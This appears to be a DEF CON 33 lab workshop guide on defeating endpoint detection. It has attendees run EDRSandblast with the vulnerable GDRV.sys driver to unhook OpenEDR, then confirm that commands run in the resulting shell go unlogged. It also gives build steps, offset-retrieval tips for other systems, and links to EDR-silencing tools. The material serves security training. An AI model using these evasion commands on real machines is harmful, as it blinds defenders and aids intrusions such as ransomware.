# EDR Killing and Silencing

## Overview

In this workshop, we'll be working with Comodo Security's OpenEDR:
- [Website](https://www.openedr.com/)
- [GitHub repo](https://github.com/ComodoSecurity/openedr)

For part 1 of our workshop, we'll be "killing" OpenEDR via [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast), a well-known EDR killer that has been used by a number of threat actors including ransomware actors.

The flow for this section is as follows:
- Review OpenEDR's output to review how it logs telemetry
- Kill OpenEDR using EDRSandblast
- Perform actions following the killing of OpenEDR and verifying that the actions do not show up in the EDR's telemetry

## Install Notepad++

1. In Explorer, navigate to `C:\Users\Public\Desktop\LAB_FILES\1-edr-killing`

1. Double-click `npp.8.8.2.Installer.x64.exe` to install Notepad++

    - Follow the prompts to install
    
    - When prompted to `Choose components`, go with the defaults

## 1 Review OpenEDR Logging

OpenEDR has been installed on the Windows host within our lab environment. Let's take a moment to review how OpenEDR logs data:

1. Open PowerShell by double-clicking `PowerShell 7` on the desktop

1. In the PowerShell prompt, run the following commands:

    1. `whoami`
  
    1. `powershell -c "Write-Host 'Testing01'"`
  
    1. `exit` to exit the PowerShell prompt

1. **Wait 2-3 minutes**, then:

1. Navigate to `C:\ProgramData\edrsvc\log\output_events` via Explorer

1. Right-click the `.log` file for the current day (most _likely_ labeled `2025-08-09.log`) and select `Edit with Notepad++`

    - If you're following along after DefCon33, your log file's name will be the current date. It for sure will __not__ be `2025-08-09.log` :).

1. Search via `Ctrl+F` for the test commands:

    1. Look for `whoami` and `write-host`
  
    1. If you do not find the logs for these executions, wait a few minutes, reload the `.log` file, and search again
    
    You should see logged process execution that looks like the following, in this case for the `Testing01` command:
    
    ``` 
    {"baseEventType":1,"baseType":1,"childProcess":{"cmdLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"Write-Host 'Testing01'\"","creationTime":1754764097580,"elevationType":3,"flsVerdict":3,"id":15875525547496000396,"imageHash":"3e72bef25a1cd88c502421e3d50a8eb4c6bd1226","imagePath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","pid":6848,"scriptContent":"<undefined>","verdict":1},"customerId":"","deviceName":"CLIENT01","endpointId":"","eventType":null,"processes":[{"creationTime":1754763108579,"flsVerdict":3,"id":13705142240392347118,"imageHash":"1727054b50f1dcba229739fa0e73bdef0797ac45","imagePath":"C:\\Windows\\System32\\winlogon.exe","pid":4252,"userName":"SYSTEM@NT AUTHORITY","verdict":1},{"creationTime":1754763132912,"flsVerdict":3,"id":16777330264515671491,"imageHash":"7e27ed0d97bc5b09c9eb37dab311797adeda2430","imagePath":"C:\\Windows\\System32\\userinit.exe","pid":5352,"userName":"pslearner@CLIENT01","verdict":1},{"creationTime":1754763132966,"flsVerdict":3,"id":1781834014505887309,"imageHash":"8baa602fdc6ba67545c0717e2b9063a0bfe3f278","imagePath":"C:\\Windows\\explorer.exe","pid":5368,"userName":"pslearner@CLIENT01","verdict":1},{"creationTime":1754764043806,"flsVerdict":3,"id":5299355317245908830,"imageHash":"82fa6e3ffe6d880722b7c5b4e5251bec6ac51af1","imagePath":"C:\\Program Files\\PowerShell\\7\\pwsh.exe","pid":904,"userName":"pslearner@CLIENT01","verdict":1}],"sessionUser":"pslearner@CLIENT01","time":1754764097593,"type":"RP1.1","version":"1.1"}
    ```
    
    - Note that the above example log includes a different execution time from what you'll see in our workshop lab environment. But you get the idea.

**Log review:** Ryan to lead OpenEDR log review with workshop attendees :).

- We'll cover what is being unhooked, why, etc. If you're following along after the workshop... not so much.

## Source Code Review: EDRSandblast

Next we'll kill OpenEDR using EDRSandblast. Technically, we'll unhook the various functions used by OpenEDR in order to launch a `cmd.exe` command prompt, run a few commands, and then review the OpenEDR logs to verify that the commands we executed do not show up in the logged telemetry.

Let's review the EDRSandblast code!

1. In Explorer, navigate to `C:\Users\Public\Desktop\LAB_FILES\1-edr-killing`

1. **Copy** both Zip archives to the desktop:

    - `EDRSandblast-exe.zip` -- This is a pre-compiled executable for EDRSandblast
    
    - `EDRSandblast-master.zip` -- This is the source code for EDRSandblast
    
        - Source code from [here](https://github.com/wavestone-cdt/EDRSandblast)
    
1. **Extract** the contents of both Zip archives that are now on your desktop:

    - Right-click each file > Select `Extract All...` > Click the `Extract` button

1. Open the newly-extracted `EDRSandblast-master` folder on the desktop, then open the nested `EDRSandblast-master` folder contained within

1. Open `EDRSandblast_CLI`

1. Right-click the `EDRSandblast.c` file > Select `Open with Code`

**Source code review:**

Ryan to lead EDRSandblast code review with workshop attendees.

### Bonus: Building EDRSandblast

NOTE: We will **not** be building EDRSandblast in the workshop.

However, if you'd like to build it yourself in another environment, the following steps provide an overview of doing so in **Visual Studio 2022**:

1. Choose the `File` menu > `Open` > `Project/Solution...`

1. Navigate to `EDRSandblast-master` > Select `EDRSandblast.sln` > Click the `Open` button at the bottom-right

1. Right-click the `EDRSandblast_CLI` directory on the right > `Build`

    - You should now see a build process take place. Example output:
    
    `========== Build: 2 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========`

Yeah it's pretty simple... moving along!

## 3 Kill OpenEDR via EDRSandblast

1. Open a Command Prompt **AS ADMIN!!**

    - Right-click `cmd` on the Desktop > Select `Run as administrator`

1. Change directory to `C:\Users\pslearner\Desktop\EDRSandblast-exe`

    - `cd C:\Users\pslearner\Desktop\EDRSandblast-exe`

1. Execute `EDRSandblast.exe` without any parameters to see options

    - `EDRSandblast.exe`
    
1. Run an Audit in EDRSandblast to check for EDR hooks:

    - `.\EDRSandblast.exe audit --kernelmode --vuln-driver .\GDRV.sys`
    
    - **Ryan to review results with class**
    
    _NOTE:_ If you are following along outside of the PluralSight labs environment, this command will fail due to the offsets of your `Ntoskrnl.exe` and `fltmgr.sys` files not being in `NtoskrnlOffsets.csv` and `FltmgrOffsets.csv`, respectively. The CSV files that we've included for the lab include the offsets for the specific NTOS Kenerl and Filter Manager system driver included in the range environment.
    
    If you're running these commands in another system, you'll need to pull the offsets for the given versions of these files within your environment. To do so, you can review [these details](https://github.com/wavestone-cdt/EDRSandblast?tab=readme-ov-file#offsets-retrieval) to learn how to pull your offsets. Alternatively, and to make things much easier, you can simply add `--internet` to the command to automatically retreive the offsets required for your system.
    
    E.g. `.\EDRSandblast.exe audit --kernelmode --vuln-driver .\GDRV.sys --internet`
    
1. Kill OpenEDR!

    - `.\EDRSandblast.exe cmd --kernelmode --vuln-driver .\GDRV.sys`
    
    - You will now have a command prompt executed while OpenEDR is unhooked!
    
    _NOTE:_ Similar to the note above -- If you are following along outside of the PluralSight labs environment, this command will fail due to the offsets of your `Ntoskrnl.exe` and `fltmgr.sys` files not being in `NtoskrnlOffsets.csv` and `FltmgrOffsets.csv`, respectively. Please see the above note for instructions.
    
    Alternatively, you can run `.\EDRSandblast.exe cmd --kernelmode --vuln-driver .\GDRV.sys --internet` to retrieve offsets automatically. Or, you know, just use the PluralSight Labs environment :).
    
1. In the new shell (w/OpenEDR killed), run the following commands:

    1. `echo Hello01`
    
    1. `ping 1.1.1.1 -n 1`
    
    1. `exit` to exit the shell
    
    - You will see that the EDRSandblast service has been stopped. The EDR is once again active.
    
1. Now that OpenEDR is once again active, run the following commands:
  
    1. `echo Hello02`
    
    1. `ping 2.2.2.2 -n 1`
    
    1. `exit` to exit the shell, which will close your prompt window
    
1. In Explorer, navigate to `C:\ProgramData\edrsvc\log\output_events`

1. Right-click the `.log` file for the current day (most _likely_ labeled `2025-08-09.log`) and select `Edit with Notepad++`

1. Search via `Ctrl+F` for the test commands:

    1. Search for the strings `Hello0` and `ping`
    
    - Check that out! You should see the following:
    
    __NOT__ logged:
    
    - `echo Hello01`
    
    - `ping 1.1.1.1 -n 1`
    
    Logged:
    
    - `echo Hello02`
    
    - `ping 2.2.2.2 -n 1`
          
And there we have it!

**Ryan to review results with class**

## 4 EDR Silencing

While killing an EDR typically involves "killing" the ability for the EDR to detect your actions, "silencing" refers to the act of preventing communication between the EDR agent and its could-based tenant.

While I aimed to write up details pertaining to silencing, details related to common silencing methods can be found in [EDR Silencers and Beyond: Exploring Methods to Block EDR Communication - Part 1](https://cloudbrothers.info/en/edr-silencers-exploring-methods-block-edr-communication-part-1/) along with [EDR Silencer and Beyond: Exploring Methods to Block EDR Communication - Part 2](https://academy.bluraven.io/blog/edr-silencer-and-beyond-exploring-methods-to-block-edr-communication-part-2).

We covered these in the DC33 workshop. But if you're reading this after the event, simply review the above article for details.

See also: [EDRSilencer GitHub repo](https://github.com/netero1010/EDRSilencer)
